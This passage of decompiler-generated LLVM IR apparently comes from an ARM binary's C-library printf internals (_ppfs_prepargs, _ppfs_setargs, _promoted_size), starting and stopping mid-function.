  %v1_10bb0 = add i32 %v0_10bb0, 1
  br label %dec_label_pc_10bb4.backedge

dec_label_pc_10bb4.backedge:                      ; preds = %dec_label_pc_10bb0, %dec_label_pc_10ba8
  %storemerge = phi i32 [ %v1_10bb0, %dec_label_pc_10bb0 ], [ %v2_10ba8, %dec_label_pc_10ba8 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_10bb4 = inttoptr i32 %storemerge to i8*
  %v2_10bb4 = load i8, i8* %v1_10bb4, align 1
  %v3_10bb4 = zext i8 %v2_10bb4 to i32
  store i32 %v3_10bb4, i32* %r0.global-to-local, align 4
  %v2_10bb8 = icmp eq i8 %v2_10bb4, 0
  br i1 %v2_10bb8, label %dec_label_pc_10bb4.dec_label_pc_10bc0_crit_edge, label %dec_label_pc_10b7c

dec_label_pc_10bb4.dec_label_pc_10bc0_crit_edge:  ; preds = %dec_label_pc_10bb4.backedge
  %v0_10bc0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10bc0

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10bb4.dec_label_pc_10bc0_crit_edge, %dec_label_pc_10b74
  %v0_10bc0 = phi i32 [ %v0_10bc0.pre, %dec_label_pc_10bb4.dec_label_pc_10bc0_crit_edge ], [ %v0_10b74, %dec_label_pc_10b74 ]
  %v1_10bc0 = load i32, i32* @r4, align 4
  %v2_10bc0 = inttoptr i32 %v1_10bc0 to i32*
  store i32 %v0_10bc0, i32* %v2_10bc0, align 4
  %v1_10bcc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10bc4

dec_label_pc_10bc4.loopexit:                      ; preds = %dec_label_pc_10b90
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10bc4

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10bc4.loopexit, %dec_label_pc_10bc0
  %v1_10bcc = phi i32 [ -1, %dec_label_pc_10bc4.loopexit ], [ %v1_10bcc.pre, %dec_label_pc_10bc0 ]
  store i32 %v3_10b30, i32* @r4, align 4
  store i32 %v6_10b30, i32* @r5, align 4
  ret i32 %v1_10bcc

; uselistorder directives
  uselistorder i32 %v3_10bb4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10b74, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10b6c, { 1, 0 }
  uselistorder i32 %v0_10b68.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 3, 4, 2, 7, 5, 0 }
  uselistorder label %dec_label_pc_10bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10b68.dec_label_pc_10b68_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10bd0 = load i32, i32* @r4, align 4
  store i32 %v3_10bd0, i32* %stack_var_-12, align 4
  %v0_10bd4 = load i32, i32* @r0, align 4
  %v1_10bd4 = add i32 %v0_10bd4, 24
  %v2_10bd4 = inttoptr i32 %v1_10bd4 to i32*
  %v3_10bd4 = load i32, i32* %v2_10bd4, align 4
  store i32 %v3_10bd4, i32* %r5.global-to-local, align 4
  store i32 %v0_10bd4, i32* @r4, align 4
  %v2_10be4 = add i32 %v0_10bd4, 76
  %v3_10be4 = inttoptr i32 %v2_10be4 to i32*
  store i32 %arg2, i32* %v3_10be4, align 4
  %tmp5 = icmp slt i32 %v3_10bd4, 1
  br i1 %tmp5, label %dec_label_pc_10c08, label %dec_label_pc_10bec

dec_label_pc_10bec:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10bf0 = load i32, i32* @r0, align 4
  %v2_10bf0 = add i32 %v1_10bf0, 8
  %v3_10bf0 = inttoptr i32 %v2_10bf0 to i32*
  store i32 0, i32* %v3_10bf0, align 4
  %v0_10bf4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10bf4 = load i32, i32* @r0, align 4
  %v2_10bf4 = add i32 %v1_10bf4, 28
  %v3_10bf4 = inttoptr i32 %v2_10bf4 to i32*
  store i32 %v0_10bf4, i32* %v3_10bf4, align 4
  %v0_10bf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10bf8 = load i32, i32* @r0, align 4
  %v2_10bf8 = add i32 %v1_10bf8, 24
  %v3_10bf8 = inttoptr i32 %v2_10bf8 to i32*
  store i32 %v0_10bf8, i32* %v3_10bf8, align 4
  %v0_10bfc = load i32, i32* %r3.global-to-local, align 4
  %v1_10bfc = load i32, i32* @r0, align 4
  %v2_10bfc = add i32 %v1_10bfc, 4
  %v3_10bfc = inttoptr i32 %v2_10bfc to i32*
  store i32 %v0_10bfc, i32* %v3_10bfc, align 4
  %v0_10c00 = call i32 @_ppfs_setargs()
  store i32 %v0_10c00, i32* @r0, align 4
  %v0_10c04 = load i32, i32* %r5.global-to-local, align 4
  %v1_10c04 = load i32, i32* @r4, align 4
  %v2_10c04 = add i32 %v1_10c04, 24
  %v3_10c04 = inttoptr i32 %v2_10c04 to i32*
  store i32 %v0_10c04, i32* %v3_10c04, align 4
  br label %dec_label_pc_10c08

dec_label_pc_10c08:                               ; preds = %entry, %dec_label_pc_10bec
  %v2_10c0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10c0c, i32* @r4, align 4
  %v1_10c10 = load i32, i32* @r0, align 4
  ret i32 %v1_10c10

; uselistorder directives
  uselistorder i32 %v0_10bd4, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_10c08, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_10c14 = load i32, i32* @r0, align 4
  %v1_10c14 = add i32 %v0_10c14, 24
  %v2_10c14 = inttoptr i32 %v1_10c14 to i32*
  %v3_10c14 = load i32, i32* %v2_10c14, align 4
  store i32 %v3_10c14, i32* %r1.global-to-local, align 4
  %v2_10c18 = icmp eq i32 %v3_10c14, 0
  %v3_10c1c = load i32, i32* @r4, align 4
  store i32 %v3_10c1c, i32* %stack_var_-8, align 4
  %v1_10c20 = add i32 %v0_10c14, 8
  %v2_10c20 = inttoptr i32 %v1_10c20 to i32*
  %v3_10c20 = load i32, i32* %v2_10c20, align 4
  store i32 %v3_10c20, i32* %r3.global-to-local, align 4
  %v6_10c28 = icmp eq i32 %v3_10c20, -2147483648
  br i1 %v2_10c18, label %dec_label_pc_10c28, label %dec_label_pc_10d60

dec_label_pc_10c28:                               ; preds = %entry
  br i1 %v6_10c28, label %dec_label_pc_10c30, label %dec_label_pc_10c48

dec_label_pc_10c30:                               ; preds = %dec_label_pc_10c28
  %v1_10c30 = add i32 %v0_10c14, 76
  %v2_10c30 = inttoptr i32 %v1_10c30 to i32*
  %v3_10c30 = load i32, i32* %v2_10c30, align 4
  store i32 %v3_10c30, i32* %r3.global-to-local, align 4
  %v1_10c34 = inttoptr i32 %v3_10c30 to i32*
  %v2_10c34 = load i32, i32* %v1_10c34, align 4
  store i32 %v2_10c34, i32* %r2.global-to-local, align 4
  %v1_10c38 = add i32 %v3_10c30, 4
  store i32 %v1_10c38, i32* %r3.global-to-local, align 4
  store i32 %v1_10c38, i32* %v2_10c30, align 4
  %v0_10c40 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c40 = load i32, i32* @r0, align 4
  %v2_10c40 = add i32 %v1_10c40, 8
  %v3_10c40 = inttoptr i32 %v2_10c40 to i32*
  store i32 %v0_10c40, i32* %v3_10c40, align 4
  %v0_10c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c44 = load i32, i32* @r0, align 4
  %v2_10c44 = add i32 %v1_10c44, 80
  %v3_10c44 = inttoptr i32 %v2_10c44 to i32*
  store i32 %v0_10c44, i32* %v3_10c44, align 4
  %v0_10c48.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10c48

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c28, %dec_label_pc_10c30
  %v1_10c64 = phi i32 [ %v0_10c14, %dec_label_pc_10c28 ], [ %v0_10c48.pre, %dec_label_pc_10c30 ]
  %v1_10c48 = add i32 %v1_10c64, 4
  %v2_10c48 = inttoptr i32 %v1_10c48 to i32*
  %v3_10c48 = load i32, i32* %v2_10c48, align 4
  store i32 %v3_10c48, i32* %r3.global-to-local, align 4
  %v6_10c4c = icmp eq i32 %v3_10c48, -2147483648
  %v1_10c50 = add i32 %v1_10c64, 80
  store i32 %v1_10c50, i32* %ip.global-to-local, align 4
  br i1 %v6_10c4c, label %dec_label_pc_10c58, label %dec_label_pc_10c70

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c48
  %v1_10c58 = add i32 %v1_10c64, 76
  %v2_10c58 = inttoptr i32 %v1_10c58 to i32*
  %v3_10c58 = load i32, i32* %v2_10c58, align 4
  store i32 %v3_10c58, i32* %r3.global-to-local, align 4
  %v1_10c5c = inttoptr i32 %v3_10c58 to i32*
  %v2_10c5c = load i32, i32* %v1_10c5c, align 4
  store i32 %v2_10c5c, i32* %r2.global-to-local, align 4
  %v1_10c60 = add i32 %v3_10c58, 4
  store i32 %v1_10c60, i32* %r3.global-to-local, align 4
  store i32 %v1_10c60, i32* %v2_10c58, align 4
  %v0_10c68 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c68 = load i32, i32* @r0, align 4
  %v2_10c68 = add i32 %v1_10c68, 4
  %v3_10c68 = inttoptr i32 %v2_10c68 to i32*
  store i32 %v0_10c68, i32* %v3_10c68, align 4
  %v0_10c6c = load i32, i32* %r2.global-to-local, align 4
  %v1_10c6c = load i32, i32* @r0, align 4
  %v2_10c6c = add i32 %v1_10c6c, 80
  %v3_10c6c = inttoptr i32 %v2_10c6c to i32*
  store i32 %v0_10c6c, i32* %v3_10c6c, align 4
  %v0_10d5017.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10c70

dec_label_pc_10c70:                               ; preds = %dec_label_pc_10c48, %dec_label_pc_10c58
  %v0_10d5017 = phi i32 [ %v1_10c64, %dec_label_pc_10c48 ], [ %v0_10d5017.pre, %dec_label_pc_10c58 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_10c74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10c74, i32* %lr.global-to-local, align 4
  %v1_10d5018 = add i32 %v0_10d5017, 28
  %v2_10d5019 = inttoptr i32 %v1_10d5018 to i32*
  %v3_10d5020 = load i32, i32* %v2_10d5019, align 4
  store i32 %v3_10d5020, i32* %r3.global-to-local, align 4
  %v5_10d5822 = icmp slt i32 %v0_10c74, %v3_10d5020
  br i1 %v5_10d5822, label %dec_label_pc_10c7c, label %dec_label_pc_10d5c.loopexit

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c70, %dec_label_pc_10d50.backedge
  %v0_10d5024 = phi i32 [ %v0_10d50, %dec_label_pc_10d50.backedge ], [ %v0_10d5017, %dec_label_pc_10c70 ]
  %v0_10c8823 = phi i32 [ %v0_10c88.be, %dec_label_pc_10d50.backedge ], [ %v0_10c74, %dec_label_pc_10c70 ]
  %v4_10c7c = mul i32 %v0_10c8823, 4
  %v5_10c7c = add i32 %v4_10c7c, %v0_10d5024
  store i32 %v5_10c7c, i32* %r3.global-to-local, align 4
  %v1_10c80 = add i32 %v5_10c7c, 40
  %v2_10c80 = inttoptr i32 %v1_10c80 to i32*
  %v3_10c80 = load i32, i32* %v2_10c80, align 4
  store i32 %v3_10c80, i32* %r3.global-to-local, align 4
  %v7_10c84 = icmp eq i32 %v3_10c80, 8
  %v1_10c88 = add i32 %v0_10c8823, 1
  store i32 %v1_10c88, i32* %lr.global-to-local, align 4
  br i1 %v7_10c84, label %dec_label_pc_10d50.backedge, label %dec_label_pc_10c90

dec_label_pc_10c90:                               ; preds = %dec_label_pc_10c7c
  %v1_10c90 = add i32 %v0_10d5024, 76
  %v2_10c90 = inttoptr i32 %v1_10c90 to i32*
  %v3_10c90 = load i32, i32* %v2_10c90, align 4
  store i32 %v3_10c90, i32* %r1.global-to-local, align 4
  %v8_10c94 = icmp sgt i32 %v3_10c80, 8
  br i1 %v8_10c94, label %dec_label_pc_10cb8, label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c90
  %v7_10c98 = icmp eq i32 %v3_10c80, 2
  br i1 %v7_10c98, label %dec_label_pc_10d08, label %dec_label_pc_10ca0

dec_label_pc_10ca0:                               ; preds = %dec_label_pc_10c98
  %v8_10ca0 = icmp sgt i32 %v3_10c80, 2
  br i1 %v8_10ca0, label %dec_label_pc_10cb0, label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10ca0
  %v1_10ca4 = icmp slt i32 %v3_10c80, 0
  br i1 %v1_10ca4, label %dec_label_pc_10d3c, label %dec_label_pc_10d08

dec_label_pc_10cb0:                               ; preds = %dec_label_pc_10ca0
  %v7_10cb0 = icmp eq i32 %v3_10c80, 7
  br i1 %v7_10cb0, label %dec_label_pc_10d1c, label %dec_label_pc_10d3c

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10c90
  %v7_10cb8 = icmp eq i32 %v3_10c80, 1024
  br i1 %v7_10cb8, label %dec_label_pc_10d08, label %dec_label_pc_10cc0

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10cb8
  %v8_10cc0 = icmp sgt i32 %v3_10c80, 1024
  br i1 %v8_10cc0, label %dec_label_pc_10cd8, label %dec_label_pc_10cc4

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10cc0
  switch i32 %v3_10c80, label %dec_label_pc_10d3c [
    i32 256, label %dec_label_pc_10d08
    i32 512, label %dec_label_pc_10d08
  ]

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10cc0
  %v7_10cd8 = icmp eq i32 %v3_10c80, 2048
  br i1 %v7_10cd8, label %dec_label_pc_10cec, label %dec_label_pc_10ce4

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cd8
  %v1_10ce0 = load i32, i32* %r4.global-to-local, align 4
  %v9_10ce0 = icmp eq i32 %v3_10c80, %v1_10ce0
  br i1 %v9_10ce0, label %dec_label_pc_10d1c, label %dec_label_pc_10d3c

dec_label_pc_10cec:                               ; preds = %dec_label_pc_10cd8
  %v1_10cec = add i32 %v3_10c90, 7
  %v1_10cf0 = and i32 %v1_10cec, -8
  store i32 %v1_10cf0, i32* %r3.global-to-local, align 4
  %v1_10cf4 = inttoptr i32 %v1_10cf0 to i32*
  %v2_10cf4 = load i32, i32* %v1_10cf4, align 8
  store i32 %v2_10cf4, i32* %r1.global-to-local, align 4
  %v3_10cf4 = or i32 %v1_10cf0, 4
  %v4_10cf4 = inttoptr i32 %v3_10cf4 to i32*
  %v5_10cf4 = load i32, i32* %v4_10cf4, align 4
  store i32 %v5_10cf4, i32* %r2.global-to-local, align 4
  %v1_10cf8 = add i32 %v1_10cf0, 8
  store i32 %v1_10cf8, i32* %r3.global-to-local, align 4
  store i32 %v1_10cf8, i32* %v2_10c90, align 4
  %v0_10d00 = load i32, i32* %ip.global-to-local, align 4
  %v1_10d00 = inttoptr i32 %v0_10d00 to i32*
  %v2_10d00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10d00, i32* %v1_10d00, align 4
  %v3_10d00 = add i32 %v0_10d00, 4
  %v4_10d00 = inttoptr i32 %v3_10d00 to i32*
  %v5_10d00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10d00, i32* %v4_10d00, align 4
  br label %dec_label_pc_10d4c

dec_label_pc_10d08:                               ; preds = %dec_label_pc_10cc4, %dec_label_pc_10cc4, %dec_label_pc_10ca4, %dec_label_pc_10cb8, %dec_label_pc_10c98
  %v1_10d08 = inttoptr i32 %v3_10c90 to i32*
  %v2_10d08 = load i32, i32* %v1_10d08, align 4
  store i32 %v2_10d08, i32* %r2.global-to-local, align 4
  %v1_10d0c = add i32 %v3_10c90, 4
  store i32 %v1_10d0c, i32* %r3.global-to-local, align 4
  store i32 %v1_10d0c, i32* %v2_10c90, align 4
  %v0_10d14 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d14 = load i32, i32* %ip.global-to-local, align 4
  %v2_10d14 = inttoptr i32 %v1_10d14 to i32*
  store i32 %v0_10d14, i32* %v2_10d14, align 4
  br label %dec_label_pc_10d4c

dec_label_pc_10d1c:                               ; preds = %dec_label_pc_10cb0, %dec_label_pc_10ce4
  %v3_10d1c = load i32, i32* %v2_10c90, align 4
  %v1_10d20 = add i32 %v3_10d1c, 7
  %v1_10d24 = and i32 %v1_10d20, -8
  store i32 %v1_10d24, i32* %r3.global-to-local, align 4
  %v1_10d28 = inttoptr i32 %v1_10d24 to i32*
  %v2_10d28 = load i32, i32* %v1_10d28, align 8
  store i32 %v2_10d28, i32* %r1.global-to-local, align 4
  %v3_10d28 = or i32 %v1_10d24, 4
  %v4_10d28 = inttoptr i32 %v3_10d28 to i32*
  %v5_10d28 = load i32, i32* %v4_10d28, align 4
  store i32 %v5_10d28, i32* %r2.global-to-local, align 4
  %v1_10d2c = add i32 %v1_10d24, 8
  store i32 %v1_10d2c, i32* %r3.global-to-local, align 4
  store i32 %v1_10d2c, i32* %v2_10c90, align 4
  %v0_10d34 = load i32, i32* %ip.global-to-local, align 4
  %v1_10d34 = inttoptr i32 %v0_10d34 to i32*
  %v2_10d34 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10d34, i32* %v1_10d34, align 4
  %v3_10d34 = add i32 %v0_10d34, 4
  %v4_10d34 = inttoptr i32 %v3_10d34 to i32*
  %v5_10d34 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10d34, i32* %v4_10d34, align 4
  br label %dec_label_pc_10d4c

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10cc4, %dec_label_pc_10cb0, %dec_label_pc_10ca4, %dec_label_pc_10ce4
  %v1_10d3c = add i32 %v3_10c90, 4
  store i32 %v1_10d3c, i32* %r3.global-to-local, align 4
  store i32 %v1_10d3c, i32* %v2_10c90, align 4
  %v0_10d44 = load i32, i32* %r1.global-to-local, align 4
  %v1_10d44 = inttoptr i32 %v0_10d44 to i32*
  %v2_10d44 = load i32, i32* %v1_10d44, align 4
  store i32 %v2_10d44, i32* %r3.global-to-local, align 4
  %v1_10d48 = load i32, i32* %ip.global-to-local, align 4
  %v2_10d48 = inttoptr i32 %v1_10d48 to i32*
  store i32 %v2_10d44, i32* %v2_10d48, align 4
  br label %dec_label_pc_10d4c

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10d1c, %dec_label_pc_10d08, %dec_label_pc_10cec, %dec_label_pc_10d3c
  %v0_10d4c = load i32, i32* %ip.global-to-local, align 4
  %v1_10d4c = add i32 %v0_10d4c, 8
  store i32 %v1_10d4c, i32* %ip.global-to-local, align 4
  %v0_10d54.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10d50.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10d50.backedge

dec_label_pc_10d50.backedge:                      ; preds = %dec_label_pc_10d4c, %dec_label_pc_10c7c
  %v0_10d50 = phi i32 [ %v0_10d50.pre, %dec_label_pc_10d4c ], [ %v0_10d5024, %dec_label_pc_10c7c ]
  %v0_10c88.be = phi i32 [ %v0_10d54.pre.pre, %dec_label_pc_10d4c ], [ %v1_10c88, %dec_label_pc_10c7c ]
  %v1_10d50 = add i32 %v0_10d50, 28
  %v2_10d50 = inttoptr i32 %v1_10d50 to i32*
  %v3_10d50 = load i32, i32* %v2_10d50, align 4
  store i32 %v3_10d50, i32* %r3.global-to-local, align 4
  %v5_10d58 = icmp slt i32 %v0_10c88.be, %v3_10d50
  br i1 %v5_10d58, label %dec_label_pc_10c7c, label %dec_label_pc_10d50.dec_label_pc_10d5c.loopexit_crit_edge

dec_label_pc_10d60:                               ; preds = %entry
  br i1 %v6_10c28, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10d60
  %v2_10d64 = add i32 %v0_10c14, 36
  %v3_10d64 = inttoptr i32 %v2_10d64 to i8*
  %v4_10d64 = load i8, i8* %v3_10d64, align 1
  %v5_10d64 = zext i8 %v4_10d64 to i32
  %v5_10d68 = mul nuw nsw i32 %v5_10d64, 8
  %v6_10d68 = add i32 %v5_10d68, %v0_10c14
  store i32 %v6_10d68, i32* %r3.global-to-local, align 4
  %v2_10d6c = add i32 %v6_10d68, 72
  %v3_10d6c = inttoptr i32 %v2_10d6c to i32*
  %v4_10d6c = load i32, i32* %v3_10d6c, align 4
  store i32 %v4_10d6c, i32* %r3.global-to-local, align 4
  store i32 %v4_10d6c, i32* %v2_10c20, align 4
  %v0_10d74.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10d60, %bb
  %v2_10d88 = phi i32 [ %v0_10d74.pre, %bb ], [ %v0_10c14, %dec_label_pc_10d60 ]
  %v1_10d74 = add i32 %v2_10d88, 4
  %v2_10d74 = inttoptr i32 %v1_10d74 to i32*
  %v3_10d74 = load i32, i32* %v2_10d74, align 4
  store i32 %v3_10d74, i32* %r3.global-to-local, align 4
  %v6_10d78 = icmp eq i32 %v3_10d74, -2147483648
  br i1 %v6_10d78, label %bb16, label %dec_label_pc_10d5c

bb16:                                             ; preds = %.thread1
  %v2_10d7c = add i32 %v2_10d88, 37
  %v3_10d7c = inttoptr i32 %v2_10d7c to i8*
  %v4_10d7c = load i8, i8* %v3_10d7c, align 1
  %v5_10d7c = zext i8 %v4_10d7c to i32
  %v5_10d80 = mul nuw nsw i32 %v5_10d7c, 8
  %v6_10d80 = add i32 %v5_10d80, %v2_10d88
  store i32 %v6_10d80, i32* %r3.global-to-local, align 4
  %v2_10d84 = add i32 %v6_10d80, 72
  %v3_10d84 = inttoptr i32 %v2_10d84 to i32*
  %v4_10d84 = load i32, i32* %v3_10d84, align 4
  store i32 %v4_10d84, i32* %r3.global-to-local, align 4
  store i32 %v4_10d84, i32* %v2_10d74, align 4
  %v0_10d8c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10d5c

dec_label_pc_10d50.dec_label_pc_10d5c.loopexit_crit_edge: ; preds = %dec_label_pc_10d50.backedge
  br label %dec_label_pc_10d5c.loopexit

dec_label_pc_10d5c.loopexit:                      ; preds = %dec_label_pc_10d50.dec_label_pc_10d5c.loopexit_crit_edge, %dec_label_pc_10c70
  %v0_10d50.lcssa = phi i32 [ %v0_10d50, %dec_label_pc_10d50.dec_label_pc_10d5c.loopexit_crit_edge ], [ %v0_10d5017, %dec_label_pc_10c70 ]
  br label %dec_label_pc_10d5c

dec_label_pc_10d5c:                               ; preds = %dec_label_pc_10d5c.loopexit, %.thread1, %bb16
  %v1_10dac = phi i32 [ %v0_10d50.lcssa, %dec_label_pc_10d5c.loopexit ], [ %v2_10d88, %.thread1 ], [ %v0_10d8c.pre, %bb16 ]
  %v1_10d8c = add i32 %v1_10dac, 8
  %v2_10d8c = inttoptr i32 %v1_10d8c to i32*
  %v3_10d8c = load i32, i32* %v2_10d8c, align 4
  store i32 %v3_10d8c, i32* %r1.global-to-local, align 4
  %v1_10d90 = icmp slt i32 %v3_10d8c, 0
  br i1 %v1_10d90, label %dec_label_pc_10d98, label %dec_label_pc_10db8

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10d5c
  %v1_10d98 = add i32 %v1_10dac, 16
  %v2_10d98 = inttoptr i32 %v1_10d98 to i32*
  %v3_10d98 = load i32, i32* %v2_10d98, align 4
  %v1_10da0 = sub i32 0, %v3_10d8c
  store i32 %v1_10da0, i32* %r1.global-to-local, align 4
  %v1_10d9c = and i32 %v3_10d98, -10
  %v1_10da4 = or i32 %v1_10d9c, 8
  store i32 %v1_10da4, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_10dac = add i32 %v1_10dac, 20
  %v3_10dac = inttoptr i32 %v2_10dac to i32*
  store i32 32, i32* %v3_10dac, align 4
  %v0_10db0 = load i32, i32* %r1.global-to-local, align 4
  %v1_10db0 = load i32, i32* @r0, align 4
  %v2_10db0 = add i32 %v1_10db0, 8
  %v3_10db0 = inttoptr i32 %v2_10db0 to i32*
  store i32 %v0_10db0, i32* %v3_10db0, align 4
  %v0_10db4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10db4 = load i32, i32* @r0, align 4
  %v2_10db4 = add i32 %v1_10db4, 16
  %v3_10db4 = inttoptr i32 %v2_10db4 to i32*
  store i32 %v0_10db4, i32* %v3_10db4, align 4
  %v1_10dbc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10db8

dec_label_pc_10db8:                               ; preds = %dec_label_pc_10d5c, %dec_label_pc_10d98
  %v1_10dbc = phi i32 [ %v1_10dac, %dec_label_pc_10d5c ], [ %v1_10dbc.pre, %dec_label_pc_10d98 ]
  %v2_10db8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10db8, i32* @r4, align 4
  ret i32 %v1_10dbc

; uselistorder directives
  uselistorder i32 %v2_10d88, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10c88.be, { 1, 0 }
  uselistorder i32 %v0_10d50, { 1, 2, 0 }
  uselistorder i32 %v3_10c90, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_10c90, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_10c80, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_10c8823, { 1, 0 }
  uselistorder i32 %v0_10d5024, { 0, 2, 1 }
  uselistorder i32 %v0_10d5017, { 2, 0, 1 }
  uselistorder i32 %v0_10c14, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_10db8, { 1, 0 }
  uselistorder label %dec_label_pc_10d5c, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10d4c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10d3c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10d1c, { 1, 0 }
  uselistorder label %dec_label_pc_10d08, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_10c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10c70, { 1, 0 }
  uselistorder label %dec_label_pc_10c48, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_10de0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10ddc

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10de8, %entry
  %v0_10ddc = phi i32 [ %v1_10ddc, %dec_label_pc_10de8 ], [ add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -36938), %entry ]
  %v1_10ddc = add i32 %v0_10ddc, -2
  %v2_10ddc = inttoptr i32 %v1_10ddc to i16*
  %v3_10ddc = load i16, i16* %v2_10ddc, align 2
  %v4_10ddc = sext i16 %v3_10ddc to i32
  store i32 %v1_10ddc, i32* @ip, align 4
  %v9_10de0 = icmp eq i32 %v4_10ddc, %v1_10de0.pre
  br i1 %v9_10de0, label %dec_label_pc_10ddc.dec_label_pc_10df0_crit_edge, label %dec_label_pc_10de8

dec_label_pc_10ddc.dec_label_pc_10df0_crit_edge:  ; preds = %dec_label_pc_10ddc
  br label %dec_label_pc_10df0

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10ddc
  %tmp = icmp ugt i32 %v1_10ddc, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -36962)
  br i1 %tmp, label %dec_label_pc_10ddc, label %dec_label_pc_10df0.loopexit

dec_label_pc_10df0.loopexit:                      ; preds = %dec_label_pc_10de8
  br label %dec_label_pc_10df0

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10df0.loopexit, %dec_label_pc_10ddc.dec_label_pc_10df0_crit_edge
  %v2_10e00.pre-phi = sub i32 %v1_10ddc, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -36962)
  store i32 %v2_10e00.pre-phi, i32* @r2, align 4
  %v4_10e04 = sdiv i32 %v2_10e00.pre-phi, 2
  %v5_10e04 = add i32 %v4_10e04, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -36938)
  %v6_10e04 = inttoptr i32 %v5_10e04 to i8*
  %v7_10e04 = load i8, i8* %v6_10e04, align 1
  %v9_10e04 = zext i8 %v7_10e04 to i32
  ret i32 %v9_10e04

; uselistorder directives
  uselistorder i32 %v2_10e00.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10ddc, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -36962), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
